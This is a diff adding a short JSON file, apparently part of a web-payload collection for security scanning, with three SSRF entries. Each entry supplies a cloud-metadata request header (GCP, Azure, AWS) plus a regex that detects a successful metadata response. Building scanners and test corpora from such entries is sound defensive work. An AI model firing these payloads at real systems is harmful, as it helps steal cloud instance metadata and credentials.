@@ -1,0 +1,35 @@
+[
+  {
+    "payload_id": "OWP-408997",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Metadata-Flavor: Google",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408998",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "Metadata: true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408999",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-aws-ec2-metadata-token-ttl-seconds: 21600",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  }
+]
